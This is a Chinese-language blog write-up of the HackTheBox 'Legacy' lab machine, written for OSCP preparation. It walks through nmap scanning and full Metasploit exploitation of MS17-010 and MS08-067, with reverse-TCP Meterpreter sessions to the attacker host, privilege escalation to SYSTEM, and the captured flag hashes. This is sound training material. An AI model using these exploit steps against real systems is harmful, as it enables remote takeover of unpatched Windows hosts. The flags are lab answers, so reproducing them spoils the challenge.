# HTB靶机 Legacy WriteUp


&lt;!--more--&gt;

备战OSCP系列，从HackTheBox靶场开始。

## Legacy

![图片](/resource/HTB靶机-Legacy-WriteUp.assets/640-20230220174153127.png)

用户评分2.5分，Tags：Injection

顺便说一句，这个跟oscp lab里的某靶机几乎一模一样。。

考点：SMB漏洞

## WriteUp

### 0.SCAN

nmap扫描服务，需要用-Pn

```shell
 $ nmap  -F 10.10.10.4 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 12:58 HKT
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 Nmap done: 1 IP address (0 hosts up) scanned in 3.07 seconds
 
 $ nmap -Pn -T4 10.10.10.4
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 13:01 HKT
 Nmap scan report for 10.10.10.4
 Host is up (0.24s latency).
 Not shown: 997 filtered tcp ports (no-response)
 PORT     STATE SERVICE
 139/tcp open   netbios-ssn
 445/tcp open   microsoft-ds
 3389/tcp closed ms-wbt-server
 
```

使用-sC 后结果如下：

```shell
 Host script results:
 |_clock-skew: mean: 5d01h01m43s, deviation: 1h24m50s, median: 5d00h01m43s
 | p2p-conficker: 
 |   Checking for Conficker.C or higher...
 |   Check 1 (port 40600/tcp): CLEAN (Timeout)
 |   Check 2 (port 62576/tcp): CLEAN (Timeout)
 |   Check 3 (port 50902/udp): CLEAN (Timeout)
 |   Check 4 (port 36848/udp): CLEAN (Timeout)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
 | smb-os-discovery: 
 |   OS: Windows XP (Windows 2000 LAN Manager)
 |   OS CPE: cpe:/o:microsoft:windows_xp::-
 |   Computer name: legacy
 |   NetBIOS computer name: LEGACY\x00
 |   Workgroup: HTB\x00
 |_ System time: 2022-03-20T09:07:28&#43;02:00
 |_smb2-time: Protocol negotiation failed (SMB2)
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_ message_signing: disabled (dangerous, but default)
 |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:8c:eb (VMware)
 
```

使用 --script vuln 快速查找相应漏洞，结果如下：

```shell
 PORT     STATE SERVICE
 139/tcp open   netbios-ssn
 445/tcp open   microsoft-ds
 3389/tcp closed ms-wbt-server
 
 Host script results:
 |_smb-vuln-ms10-054: false
 |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
 | smb-vuln-ms08-067: 
 |   VULNERABLE:
 |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
 |     State: VULNERABLE
 |     IDs: CVE:CVE-2008-4250
 |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
 |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
 |           code via a crafted RPC request that triggers the overflow during path canonicalization.
 |           
 |     Disclosure date: 2008-10-23
 |     References:
 |       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
 |_     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
 | smb-vuln-ms17-010: 
 |   VULNERABLE:
 |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
 |     State: VULNERABLE
 |     IDs: CVE:CVE-2017-0143
 |     Risk factor: HIGH
 |       A critical remote code execution vulnerability exists in Microsoft SMBv1
 |       servers (ms17-010).
 |           
 |     Disclosure date: 2017-03-14
 |     References:
 |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 |_     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
 
```

可利用：ms08-067,ms17-010

### 1.ms17-010

使用MSF，查找相应漏洞利用模块

```shell
 $ msfconsole
 msf6 &gt; search ms17-010
 
 Matching Modules
 ================
 
    # Name                                     Disclosure Date Rank     Check Description
    -  ----                                      ---------------  ----     -----  -----------
    0 exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average Yes   MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1 exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2 auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3 auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4 exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great   Yes   SMB DOUBLEPULSAR Remote Code Execution
 
 
 Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
 
 msf6 &gt; use exploit/windows/smb/ms17_010_psexec 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 10.10.10.4
 rhosts =&gt; 10.10.10.4
 msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 10.10.14.2
 lhost =&gt; 10.10.14.2
 msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
 
 [*] Started reverse TCP handler on 10.10.14.2:4444 
 [*] 10.10.10.4:445 - Target OS: Windows 5.1
 [*] 10.10.10.4:445 - Filling barrel with fish... done
 [*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
 [*] 10.10.10.4:445 -   [*] Preparing dynamite...
 [*] 10.10.10.4:445 -           [*] Trying stick 1 (x86)...Boom!
 [*] 10.10.10.4:445 -   [&#43;] Successfully Leaked Transaction!
 [*] 10.10.10.4:445 -   [&#43;] Successfully caught Fish-in-a-barrel
 [*] 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
 [*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e77660
 [*] 10.10.10.4:445 - Built a write-what-where primitive...
 [&#43;] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
 [*] 10.10.10.4:445 - Selecting native target
 [*] 10.10.10.4:445 - Uploading payload... CUwrRlZx.exe
 [*] 10.10.10.4:445 - Created \CUwrRlZx.exe...
 [&#43;] 10.10.10.4:445 - Service started successfully...
 [*] Sending stage (175174 bytes) to 10.10.10.4
 [*] 10.10.10.4:445 - Deleting \CUwrRlZx.exe...
 [*] Meterpreter session 1 opened (10.10.14.2:4444 -&gt; 10.10.10.4:1031 ) at 2022-03-1513:52:36 &#43;0800
 
 meterpreter &gt; 
 meterpreter &gt; getsystem 
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 meterpreter &gt; shell 
 cd C:\Documents and Settings\john\Desktop
 C:\Documents and Settings\john\Desktop&gt;more user.txt   
 more user.txt
 e69af0e4f443de7e36876fda4ec7644f
 
 cd C:\Documents and Settings\Administrator\Desktop
 C:\Documents and Settings\Administrator\Desktop&gt;more root.txt
 more root.txt
 993442d258b0e0ec917cae9e695d5713
 
 # shell 进去太笨重了
 meterpreter &gt; search -f user.txt
 Found 1 result...
 =================
 Path                                             Size (bytes) Modified (UTC)
 ----                                             ------------  --------------
 c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 14:19:49 &#43;0800
 
 meterpreter &gt; cat &#34;c:\Documents and Settings\john\Desktop\user.txt&#34;
 e69af0e4f443de7e36876fda4ec7644
 
 meterpreter &gt; search -f root.txt
 Found 1 result...
 =================
 
 Path                                                     Size (bytes) Modified (UTC)
 ----                                                      ------------  --------------
 c:\Documents and Settings\Administrator\Desktop\root.txt  32            2017-03-1614:18:50 &#43;0800
 
 meterpreter &gt; cat &#34;c:\Documents and Settings\Administrator\Desktop\root.txt&#34;
 993442d258b0e0ec917cae9e695d5713
 
```

serach -f 文件名查找文件路径

Kali `/usr/share/windows-binaries`目录下自带一些Windows下命令

### 2.ms08-067

```shell
 msf6 exploit(windows/smb/ms17_010_psexec) &gt; use windows/smb/ms08_067_netapi
 msf6 exploit(windows/smb/ms08_067_netapi) &gt; set rhosts 10.10.10.4
 rhosts =&gt; 10.10.10.4
 msf6 exploit(windows/smb/ms08_067_netapi) &gt; set lhost 10.10.14.2
 lhost =&gt; 10.10.14.2
 msf6 exploit(windows/smb/ms08_067_netapi) &gt; run
 
 [*] Started reverse TCP handler on 10.10.14.2:4444 
 [*] 10.10.10.4:445 - Automatically detecting the target...
 [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
 [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
 [*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
 [*] Sending stage (175174 bytes) to 10.10.10.4
 [*] Meterpreter session 2 opened (10.10.14.2:4444 -&gt; 10.10.10.4:1032 ) at 2022-03-15 14:42:38 &#43;0800
 
 meterpreter &gt; 
 meterpreter &gt; upload /usr/share/windows-binaries/whoami.exe
 meterpreter &gt; shell
 C:\WINDOWS\system32&gt;whoami
 whoami
 NT AUTHORITY\SYSTEM
 
```



## 他山之玉

- [Hackthebox walkthrough - Legacy（考点:smb利用 blue）](https://blog.csdn.net/weixin_45527786/article/details/105124115)：使用了另一个exp工具：[AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)，提到了WindowsXP系统没有whoami的问题。
- [HackTheBox — Legacy Writeup](https://coldfusionx.github.io/posts/LegacyHTB/)：使用了MS08-067（python脚本）和MS07-010（python脚本&#43;MSF），提到了`/usr/share/windows-binaries/`
- 在OSCP的进攻方认证考试中只允许对一台主机用msf，所以在测试的时候尽量避免用msf（直接用msf很low）


---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/hackthebox-legacy/  

